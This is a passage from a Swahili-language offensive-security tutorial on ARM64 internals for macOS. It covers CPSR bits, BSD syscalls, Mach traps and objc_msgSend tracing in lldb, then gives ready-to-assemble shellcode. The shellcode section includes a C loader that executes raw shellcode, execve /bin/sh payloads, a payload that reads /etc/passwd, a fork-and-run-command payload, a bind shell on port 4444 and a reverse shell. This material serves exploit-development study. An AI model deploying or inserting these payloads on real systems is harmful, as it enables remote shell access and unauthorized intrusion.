- Bit za **`J`** na **`T`**: **`J`** inapaswa kuwa 0 na ikiwa **`T`** ni 0 seti ya maelekezo A32 inatumiwa, na ikiwa ni 1, T32 inatumiwa.
- IT Block State Register (`ITSTATE`): Hizi ni bits kutoka 10-15 na 25-26. Zinahifadhi masharti kwa maelekezo ndani ya kundi lililo na nyongeza ya **`IT`**.
- Bit ya **`E`**: Inaonyesha **endianness**.
- Mode na Exception Mask Bits (0-4): Zinaamua hali ya sasa ya utekelezaji. Bit ya **5** inaonyesha ikiwa programu inaendesha kama 32bit (1) au 64bit (0). Nyingine 4 zinaonyesha **mode ya exception inayotumika sasa** (wakati exception inatokea na inashughulikiwa). Nambari iliyowekwa **inaonyesha kipaumbele cha sasa** au ikiwa exception nyingine itachochewa wakati hii inaendelea kushughulikiwa.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Exceptions fulani zinaweza kuzimwa kwa kutumia bits **`A`**, `I`, `F`. Ikiwa **`A`** ni 1 inamaanisha **asynchronous aborts** zitatolewa. **`I`** inasanidi kujibu Requests za Interrupt za vifaa vya nje (IRQs). na `F` inahusiana na Fast Interrupt Requests (FIRs).

## macOS

### BSD syscalls

Angalia [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) au endesha `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls zitakuwa na **x16 > 0**.

### Mach Traps

Angalia katika [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) `mach_trap_table` na katika [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototypes. mex number ya Mach traps ni `MACH_TRAP_TABLE_COUNT` = 128. Mach traps zitakuwa na **x16 < 0**, hivyo unahitaji kuita nambari kutoka kwenye orodha ya awali ukiweka **minus**: **`_kernelrpc_mach_vm_allocate_trap`** ni **`-10`**.

Unaweza pia kuangalia **`libsystem_kernel.dylib`** katika disassembler ili kupata jinsi ya kuita syscalls hizi (na BSD):
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Kumbuka kwamba **Ida** na **Ghidra** pia zinaweza ku-decompile **specific dylibs** kutoka cache kwa kupitisha cache.

> [!TIP]
> Wakati mwingine ni rahisi kukagua msimbo wa **decompiled** kutoka **`libsystem_kernel.dylib`** **than** kukagua **source code** kwa sababu msimbo wa syscalls kadhaa (BSD na Mach) unazalishwa kupitia scripts (check comments in the **source code**) wakati katika dylib unaweza kupata kinachoitwa.

### machdep calls

XNU inasaidia aina nyingine ya miito inayoitwa machine dependent. Idadi ya miito hii inategemea architecture na wala miito wala nambari hazihakikishiwi kubaki thabiti.

### comm page

Hii ni kernel owner memory page ambayo ime-mapped kwenye address scape ya kila process ya mtumiaji. Inalenga kufanya mabadiliko kutoka user mode kwenda kernel space yawe haraka kuliko kutumia syscalls kwa huduma za kernel zinazotumika mara nyingi kiasi kwamba mabadiliko hayo yangekuwa yasiyefaa sana.

Kwa mfano call `gettimeofdate` husoma thamani ya `timeval` moja kwa moja kutoka comm page.

### objc_msgSend

Ni kawaida sana kupata function hii ikitumika katika programu za Objective-C au Swift. Function hii inaruhusu kuitisha method ya objective-C object.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointer to the instance
- x1: op -> Selector of the method
- x2... -> Rest of the arguments of the invoked method

Basi, ikiwa utaweka breakpoint kabla ya branch kuelekea function hii, unaweza kwa urahisi kuona ni nini kinachoitwa kwenye lldb kwa (katika mfano huu object inaita object kutoka `NSConcreteTask` ambayo ita-run command):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Kwa kuweka env variable **`NSObjCMessageLoggingEnabled=1`**, inawezekana kufanya **log** wakati function hii inaitwa katika faili kama `/tmp/msgSends-pid`.
>
> Zaidi ya hayo, kwa kuweka **`OBJC_HELP=1`** na kuendesha binary yoyote utaona environment variables nyingine ambazo unaweza kutumia ku-**log** wakati vitendo fulani vya Objc-C vinapotokea.

Wakati function hii inaitwa, inahitajika kupata method iliyoitwa ya instance iliyobainishwa; kwa ajili yake hufanywa tafutizi mbalimbali:

- Fanya uchunguzi wa optimistic cache lookup:
- Ikifanikiwa, imemalizika
- Chukua runtimeLock (read)
- Ikiwa (realize && !cls->realized) realize class
- Ikiwa (initialize && !cls->initialized) initialize class
- Jaribu cache ya class yenyewe:
- Ikifanikiwa, imemalizika
- Jaribu orodha ya method za class:
- Iwapo imepatikana, jaza cache na imemalizika
- Jaribu cache ya superclass:
- Ikifanikiwa, imemalizika
- Jaribu orodha ya method za superclass:
- Iwapo imepatikana, jaza cache na imemalizika
- Ikiwa (resolver) jaribu method resolver, na rudia kutoka class lookup
- Ikiwa bado uko hapa (= all else has failed) jaribu forwarder

### Shellcodes

Ili ku-compile:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Ili kutoa bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Kwa macOS mpya zaidi:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code ili kujaribu shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Imechukuliwa kutoka [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) na imeelezewa.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Soma na cat

Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, hivyo hoja ya pili (x1) ni an array ya params (ambayo katika memory inamaanisha stack ya addresses).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Endesha amri kwa sh kupitia fork ili mchakato mkuu usifariki
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell kutoka [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) kwenye **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Kutoka [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell kwa **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
